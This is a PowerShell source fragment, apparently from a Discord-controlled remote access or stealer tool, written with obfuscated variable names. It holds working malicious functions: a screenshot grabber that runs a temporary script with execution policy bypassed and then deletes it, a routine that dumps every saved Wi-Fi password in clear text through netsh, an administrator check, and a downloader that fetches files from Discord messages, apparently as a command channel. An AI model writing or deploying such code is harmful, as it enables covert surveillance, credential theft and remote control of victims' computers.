function Take-Screenshot {
    param([string]$Path)
    try {
        $ps1 = Join-Path $env:TEMP "ss_$(Get-Random).ps1"
        $iBWw = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Path))
        $UqTX = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$path = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$iBWw'))
`$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height
`$g = [System.Drawing.Graphics]::FromImage(`$bmp)
`$g.CopyFromScreen(`$b.Location, [System.Drawing.Point]::Empty, `$b.Size)
`$bmp.Save(`$path, [System.Drawing.Imaging.ImageFormat]::Png)
`$g.Dispose()
`$bmp.Dispose()
"@
        $UqTX | Out-File -FilePath $ps1 -Encoding UTF8 -Force
        & $script:psExe -NoProfile -STA -ExecutionPolicy Bypass -File $ps1 2>&1 | Out-Null
        Remove-Item $ps1 -Force -EA SilentlyContinue
        return (Test-Path $Path)
    } catch { return $false }
}

function Test-Admin {
    try { ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { $false }
}

function Get-WifiPasswords {
    try {
        $IJXS = (netsh wlan show profiles) -split "`n" | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
        $AoDb = @()
        foreach ($DpOtxiEJ in $IJXS) {
            $gUBhD = (netsh wlan show profile name="$DpOtxiEJ" key=clear) -split "`n" | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
            $AoDb += "$DpOtxiEJ : $(if($gUBhD){$gUBhD}else{'(none)'})"
        }
        return ($AoDb -join "`n")
    } catch { return "err: $_" }
}

function Download-DiscordAttachment {
    param($Message, [string]$SaveDir = $null)
    if (-not $Message.attachments -or $Message.attachments.Count -eq 0) { return @() }
    if (-not $SaveDir) { $SaveDir = $script:workDir }
    if (-not (Test-Path -LiteralPath $SaveDir)) { New-Item -ItemType Directory -Path $SaveDir -Force | Out-Null }
    $ojWOm = @()
    foreach ($vdmqY in $Message.attachments) {
        try {
            $VPPtrAM = ($vdmqY.filename -replace '[\\/:*?"<>|]', '_')
            $path = Join-Path $SaveDir $VPPtrAM
            $hFUm = 1
            $F06Fj5cB = [System.IO.Path]::GetFileNameWithoutExtension($VPPtrAM)
            $K7VSs0HD = [System.IO.Path]::GetExtension($VPPtrAM)
            while (Test-Path -LiteralPath $path) { $path = Join-Path $SaveDir "$F06Fj5cB`_$hFUm$K7VSs0HD"; $hFUm++ }
            Invoke-WebRequest -Uri $vdmqY.url -OutFile $path -UseBasicParsing -Headers @{ "User-Agent" = "DiscordBot" }
            $ojWOm += $path
        } catch { }
    }
    return $ojWOm
}

